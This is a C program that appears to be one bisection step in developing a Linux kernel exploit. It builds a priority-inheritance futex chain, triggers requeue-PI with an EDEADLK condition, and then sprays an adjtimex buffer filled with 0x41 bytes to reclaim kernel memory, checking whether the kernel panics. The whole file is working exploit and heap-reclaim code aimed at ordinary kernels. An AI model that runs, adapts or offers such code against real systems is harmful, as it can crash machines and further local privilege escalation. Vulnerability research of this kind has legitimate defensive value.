/**
 * Bisect: EDEADLK + adjtimex reclaim, NO consumer thread.
 * Isolates whether panic needs sched_setattr consumer.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif

static uint32_t f_wait __attribute__((aligned(64)));
static uint32_t f_pi_target __attribute__((aligned(64)));
static uint32_t f_pi_chain __attribute__((aligned(64)));
static atomic_int waiter_ready, waiter_waiting, owner_started, owner_on_chain;
static atomic_int wait_returned, all_done;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, const void *timeout,
                     uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static void *waiter_thread(void *arg) {
  (void)arg;
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(500);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 3;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  atomic_store(&wait_returned, 1);
  printf("[W] WAIT ret=%ld errno=%d\n", r, errno);
  fflush(stdout);

  unsigned char buf[256];
  memset(buf, 0x41, sizeof(buf));
  *(uint64_t *)(buf + 0x50) = 0x4141414141414141ULL;
  errno = 0;
  r = syscall(SYS_adjtimex, buf);
  printf("[W] adjtimex ret=%ld errno=%d\n", r, errno);
  fflush(stdout);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&all_done, 1);
  printf("[W] done\n");
  fflush(stdout);
  return NULL;
}

static void *owner_thread(void *arg) {
  (void)arg;
  futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&waiter_ready))
    usleep(500);
  atomic_store(&owner_started, 1);
  atomic_store(&owner_on_chain, 1);
  printf("[O] chain lock\n");
  fflush(stdout);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  printf("[O] got chain\n");
  fflush(stdout);
  while (!atomic_load(&all_done))
    usleep(10000);
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("edeadlk_adjtimex_only (no consumer)\n");
  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot;
  pthread_create(&wt, NULL, waiter_thread, NULL);
  pthread_create(&ot, NULL, owner_thread, NULL);
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_on_chain))
    usleep(1000);
  usleep(80000);
  errno = 0;
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)(uintptr_t)1,
                     &f_pi_target, f_wait);
  printf("[M] CMP ret=%ld errno=%d\n", rr, errno);
  for (int i = 0; i < 600 && !atomic_load(&all_done); i++)
    usleep(10000);
  pthread_join(wt, NULL);
  pthread_join(ot, NULL);
  printf("=== SURVIVED ===\n");
  return 0;
}
